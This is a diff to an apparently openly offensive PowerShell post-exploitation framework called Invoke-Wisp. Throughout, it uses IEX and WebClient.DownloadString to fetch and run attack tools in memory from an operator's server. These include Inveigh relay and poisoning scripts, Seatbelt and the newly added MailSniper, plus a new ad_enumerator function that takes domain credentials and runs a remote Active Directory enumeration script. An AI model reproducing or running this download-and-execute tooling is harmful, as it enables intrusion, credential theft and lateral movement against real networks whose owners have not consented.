@@ -2,6 +2,7 @@
     CREATED BY KARMAZ
 #>
 $global:url_1029384756=$null
+$global:mem_1029384756=$null
 
 function Invoke-Wisp {
     [Parameter(Mandatory, HelpMessage = "Please provide a server url address using -url 'http://<your_server>/'")]
@@ -43,6 +44,8 @@ function Memory_Load {
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Inveigh.ps1")
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Inveigh-Relay.ps1")
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Invoke-Seatbelt.ps1")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/MailSniper.ps1")
+    $global:mem_1029384756=1
 }
 
 function Escalation {
@@ -65,7 +68,9 @@ function fortification {
         return
     }
     IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/fort.txt")
-    $global:fort_1029384756=1
+    if($mem_1029384756 -eq $null){
+        . Memory_Load
+    }
 }
 
 function looting {
@@ -92,3 +97,21 @@ function get_system {
 }
 
 function is64 {[Environment]::Is64BitProcess}
+
+function ad_enumerator {
+    Param(
+        [Parameter(Mandatory, HelpMessage = "Please provide a domain -domain 'domain.com'")]
+        [string]$domain,
+        [string]$user,
+        [string]$pass,
+        [switch]$asme
+    )
+    $global:asme_1029384756=$asme
+    $global:domain_1029384756=$domain
+    $global:user_1029384756=$user
+    $global:pass_1029384756=$pass
+    if($mem_1029384756 -eq $null){
+        . Memory_Load
+    }
+    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/ad_enum.txt")
+}
